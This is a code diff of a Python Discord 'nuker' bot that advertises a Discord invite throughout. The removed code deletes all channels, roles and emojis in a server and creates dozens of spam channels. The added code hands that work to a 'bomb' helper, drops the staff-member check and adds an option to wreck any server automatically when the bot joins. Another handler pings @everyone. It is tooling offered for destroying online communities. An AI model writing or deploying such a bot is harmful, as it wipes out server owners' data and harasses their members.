@@ -1,9 +1,13 @@
 import discord, random, json, os
 from discord.ext import commands
-from colorama import Fore, init
-from dotenv import load_dotenv
-init(autoreset=True)
-load_dotenv()
+from utili import printMessage, bomb
+
+if os.name == "nt":
+    os.system("cls")
+else:
+    os.system("clear")
+
+os.system("title Simple N$ker / Made by nukerdev - https://discord.gg/6pCbgbYWM7")
 
 # https://discord.gg/6pCbgbYWM7
 
@@ -14,13 +18,14 @@ bot = commands.Bot(command_prefix="$", intents=intents)
 
 if not os.path.exists("config.json"):
     with open("config.json", "w") as f:
-        f.write('{"token": "BOT TOKEN HERE"}')
-        print(f"{Fore.GREEN}Created config.json file!")
+        f.write('{"token": "BOT TOKEN HERE", "nuke_on_join": true}')
+        printMessage(f"Created config.json file!")
 
 # https://discord.gg/6pCbgbYWM7
 
 with open("config.json", "r") as f:
     config = json.load(f)
+    nuke_on_join = config["nuke_on_join"]
 
 # THIS IS A SIMPLE NUKER
 # ITS NOT FAST BUT IT WORKS! 
@@ -28,8 +33,14 @@ with open("config.json", "r") as f:
 
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user}")
-    print(f"Made by {Fore.GREEN}nukerdev {Fore.RESET}| {Fore.RED}Join {Fore.CYAN}https://discord.gg/6pCbgbYWM7 {Fore.RESET}for better bots and tools!")
+
+    printMessage("""
+        
+| Made by nukerdev |
+Join https://discord.gg/6pCbgbYWM7 for better bots and tools!
+        
+    """)
+    printMessage(f"Logged in as {bot.user}")
 
 # https://discord.gg/6pCbgbYWM7
  
@@ -37,77 +48,20 @@ async def on_ready():
 async def nuke(ctx):
 
     # https://discord.gg/6pCbgbYWM7
-
-    author: discord.Member = ctx.author
-    for role in author.roles:
-        if "admin" in role.name.lower() or "owner" in role.name.lower():
-            print(f"{Fore.RED}BRO YOU A STAFF F$CK YOU!")
-            return
     
-    guild: discord.Guild = ctx.guild
-
-    # https://discord.gg/6pCbgbYWM7
-
-    try:
-        await ctx.message.delete()
-    except discord.errors.NotFound:
-        print(f"{Fore.RED}Message not found.")
-        return
-    except discord.HTTPException:
-        print(f"{Fore.RED}Failed to delete message.")
-        return
-
-    print(f"{Fore.GREEN}Nuking {Fore.CYAN}{guild.name}...")
-    
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-            print(f"{Fore.RED}Deleted channel {channel.name}")
-        except discord.errors.NotFound:
-            print(f"{Fore.RED}Channel not found.")
-        print(f"{Fore.RED}Deleted channel {channel.name}")
-    
-# https://discord.gg/6pCbgbYWM7
- 
-    for role in guild.roles:
-        if role.name != "@everyone":
-            try:
-                await role.delete()
-                print(f"{Fore.RED}Deleted role {role.name}")
-            except discord.errors.NotFound:
-                print(f"{Fore.RED}Role not found.")
-                continue
-            except discord.HTTPException:
-                continue
-            print(f"{Fore.RED}Deleted role {role.name}")
-    
-    # https://discord.gg/6pCbgbYWM7
- 
-    for emoji in guild.emojis:
-        try:
-            await emoji.delete()
-            print(f"{Fore.RED}Deleted emoji {emoji.name}")
-        except discord.errors.NotFound:
-            print(f"{Fore.RED}Emoji not found.")
-        except discord.HTTPException:
-            continue
-        print(f"{Fore.RED}Deleted emoji {emoji.name}")
-    
-# https://discord.gg/6pCbgbYWM7
- 
-    for i in range(50):
-        names = ["BOMB-WAS-HERE", "IMAGINE-GET-BOMBED", "I-LIKE-YOUR-SERVER-NOW", "JOIN-N$KE-COMMUNITY"]
-        name = random.choice(names)
-        try:
-            await guild.create_text_channel(name)
-            print(f"{Fore.GREEN}Created text channel {name}")
-        except discord.errors.Forbidden:
-            print(f"{Fore.RED}no perm.")
-        except discord.HTTPException:
-            continue
+    await ctx.message.delete()
+    await bomb(ctx.author)
+    printMessage("N$ke Command executed!")
 
 # https://discord.gg/6pCbgbYWM7
- 
+
+
+@bot.event
+async def on_guild_join(guild: discord.Guild):
+    if nuke_on_join == True:
+        await bomb(guild.get_member(bot.user.id))
+        printMessage("Join on N$ke executed!")
+
 @bot.event
 async def on_guild_channel_create(channel):
     
@@ -119,15 +73,15 @@ async def on_guild_channel_create(channel):
         try:
             await channel.send(f"{random_message} ||@everyone||")
         except discord.errors.Forbidden:
-            print(f"{Fore.RED}no perm.")
+            printMessage(f"no perm.")
 
 # https://discord.gg/6pCbgbYWM7
-
+ 
 if __name__ == "__main__":
     try:
         bot.run(config["token"])
     except discord.errors.LoginFailure:
-        print(f"{Fore.RED}Invalid token.")
+        printMessage(f"Invalid token.")
         exit()
 
 # https://discord.gg/6pCbgbYWM7
